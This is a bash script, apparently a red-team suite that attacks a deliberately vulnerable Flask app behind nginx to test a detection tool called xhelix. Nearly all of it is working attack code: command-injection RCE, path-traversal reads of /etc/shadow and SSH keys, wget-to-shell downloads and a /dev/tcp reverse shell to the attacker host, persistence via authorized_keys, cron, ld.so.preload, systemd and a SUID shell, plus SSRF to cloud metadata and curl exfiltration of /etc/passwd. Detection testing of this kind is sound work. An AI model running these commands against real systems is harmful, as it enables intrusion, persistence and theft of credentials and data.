#!/usr/bin/env bash
# run_remote_suite.sh — drive the xhelix red-team attack suite from
# an external attacker host against the victim (nginx + vulnerable
# Flask app behind it).
#
# Run FROM the attacker box, NOT from the victim.
#
# Usage:
#   TARGET=attack.nocgurus.com ATTACKER=135.181.79.13 \
#     bash tests/redteam/run_remote_suite.sh [phase]
#
# Phases:
#   recon      — fingerprint the target (nmap, headers, robots)
#   rce        — exercise the shell-injection RCE endpoint
#   lfi        — path-traversal file reads
#   memory     — fetch + run memory-class PoCs (mmap RWX, mprotect W->X, memfd_exec)
#   persist    — drop persistence (cron, authorized_keys, ld.so.preload)
#   exfil      — SSRF, DNS exfil, c2 beacon
#   all        — every phase, in order (default)
#
# Exits with the number of phases that errored (0 = all hit the target
# successfully). xhelix on the victim side decides whether to detect.

set -uo pipefail

TARGET="${TARGET:-attack.nocgurus.com}"
ATTACKER="${ATTACKER:-$(hostname -I | awk '{print $1}')}"
PAYLOAD_DROP="${PAYLOAD_DROP:-/tmp/xhe-poc}"
PHASE="${1:-all}"

H="http://$TARGET"
RED=$'\033[31m'; GRN=$'\033[32m'; YEL=$'\033[33m'; CYA=$'\033[36m'; NC=$'\033[0m'

step()  { printf "${CYA}[*]${NC} %s\n" "$*"; }
ok()    { printf "${GRN}[+]${NC} %s\n" "$*"; }
warn()  { printf "${YEL}[!]${NC} %s\n" "$*"; }
fail()  { printf "${RED}[x]${NC} %s\n" "$*"; }

uget() { curl -sS -m 10 "$1" 2>/dev/null || true; }

rce_cmd() {
    local raw="$1"
    local enc
    enc=$(python3 -c 'import sys,urllib.parse as u;print(u.quote(sys.argv[1]))' "$raw")
    uget "$H/exec?cmd=$enc"
}

phase_recon() {
    step "recon - DNS + nmap + headers"
    getent hosts "$TARGET" || warn "no DNS, using /etc/hosts mapping if present"
    nmap -p80,443,22,8080,8443 -Pn --max-retries 1 "$TARGET" 2>&1 | tail -10
    step "HTTP banner"
    curl -sI "$H/" | head -10
    step "robots / well-known"
    uget "$H/robots.txt" | head -5
    uget "$H/.git/config" | head -5
    uget "$H/.env" | head -5
    ok "recon done"
}

phase_rce() {
    step "rce - shell injection endpoint"
    for cmd in 'id' 'whoami' 'uname -a' 'cat /etc/passwd' 'cat /etc/os-release' \
               'ps auxf' 'ss -tnp' 'env' 'mount' 'find / -perm -4000 2>/dev/null | head' ; do
        ok "rce: $cmd"
        rce_cmd "$cmd" | head -2
    done
    step "rce - staged base64 payload (download-and-execute pattern)"
    rce_cmd "echo aWQ7d2hvYW1pCg== | base64 -d | sh"
    step "rce - wget remote stage (DNS resolution + outbound)"
    rce_cmd "wget -qO- http://${ATTACKER}:9001/stage.sh 2>&1 | sh"
    step "rce - curl c2 callback"
    rce_cmd "curl -s http://${ATTACKER}:9002/beacon?h=\$(hostname) &"
    step "rce - reverse-shell-style (bash /dev/tcp)"
    rce_cmd "bash -c 'exec 5<>/dev/tcp/${ATTACKER}/9999;sh <&5 >&5 2>&5' &"
    ok "rce phase done"
}

phase_lfi() {
    step "lfi - path traversal reads"
    for p in /etc/passwd /etc/shadow /etc/hostname /root/.ssh/id_rsa /proc/self/environ \
             ../../../etc/passwd /proc/version /etc/nginx/nginx.conf ; do
        ok "lfi: $p"
        uget "$H/read?path=$p" | head -2
    done
    ok "lfi phase done"
}

phase_memory() {
    step "memory - fetch PoCs from attacker, exec via RCE"
    if [[ ! -d "$PAYLOAD_DROP" ]]; then
        warn "no PoC drop at $PAYLOAD_DROP - skipping mem class PoCs."
        warn "scp tests/redteam/poc/ from victim, build, then re-run."
        return 1
    fi
    if ! pgrep -f "http.server 9001" >/dev/null; then
        ( cd "$PAYLOAD_DROP" && python3 -m http.server 9001 >/dev/null 2>&1 & )
        sleep 1
    fi
    for poc in mmap_rwx mprotect_wx memfd_exec ptrace_attach process_vm_readv_poc ; do
        if [[ ! -f "$PAYLOAD_DROP/$poc" ]]; then
            warn "missing $PAYLOAD_DROP/$poc - build it first (cd tests/redteam/poc && make)"
            continue
        fi
        ok "memory: $poc"
        rce_cmd "cd /tmp && wget -q http://${ATTACKER}:9001/$poc -O $poc && chmod +x $poc && ./$poc 2>&1 | head -3"
    done
    ok "memory phase done"
}

phase_persist() {
    step "persist - drop persistence artifacts (FIM should fire)"
    ok "persist: /root/.ssh/authorized_keys"
    rce_cmd "mkdir -p /root/.ssh; echo 'ssh-rsa AAAAATTACKERKEY attacker@${ATTACKER}' >> /root/.ssh/authorized_keys"
    ok "persist: /etc/cron.d/xhelix-test"
    rce_cmd "echo '*/1 * * * * root /usr/bin/id > /tmp/.beacon' > /etc/cron.d/xhelix-test"
    ok "persist: /etc/ld.so.preload"
    rce_cmd "echo /tmp/evil.so > /etc/ld.so.preload"
    ok "persist: /etc/systemd/system/evil.service"
    rce_cmd "printf '[Service]\nExecStart=/bin/sh -c id\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/evil.service"
    ok "persist: SUID binary copy"
    rce_cmd "cp /bin/sh /tmp/.suidsh && chmod 4755 /tmp/.suidsh"
    ok "persist phase done"
}

phase_exfil() {
    step "exfil - SSRF to cloud metadata"
    uget "$H/fetch?url=http://169.254.169.254/latest/meta-data/" | head -3
    uget "$H/fetch?url=http://metadata.google.internal/computeMetadata/v1/" | head -3
    step "exfil - DNS tunneling pattern"
    rce_cmd "for i in 1 2 3 4 5; do nslookup x\$i-\$(date +%s).${ATTACKER//.}.attacker.io ; done"
    step "exfil - curl known-bad-ish hosts (Spamhaus DROP probe)"
    rce_cmd "curl -s --max-time 3 http://192.0.2.1/ ; curl -s --max-time 3 http://198.51.100.1/"
    step "exfil - base64 of /etc/passwd outbound"
    rce_cmd "curl --data-binary @<(base64 /etc/passwd) http://${ATTACKER}:9002/x"
    ok "exfil phase done"
}

case "$PHASE" in
    recon)   phase_recon ;;
    rce)     phase_rce ;;
    lfi)     phase_lfi ;;
    memory)  phase_memory ;;
    persist) phase_persist ;;
    exfil)   phase_exfil ;;
    all)
        phase_recon; echo
        phase_rce; echo
        phase_lfi; echo
        phase_memory; echo
        phase_persist; echo
        phase_exfil
        ;;
    *) fail "unknown phase: $PHASE (try: recon|rce|lfi|memory|persist|exfil|all)"; exit 2 ;;
esac

echo
ok "suite finished - now on the VICTIM run:"
echo "    sudo xhelixctl protect list"
echo "    sudo xhelixctl forensic iocs"
echo "    sudo grep -E 'ALERT|alert|signal|cooccur' /var/log/xhelix/xhelix.out | tail -50"
echo "    sudo find /var/lib/xhelix/forensic -name '*.jsonl' -exec wc -l {} +"
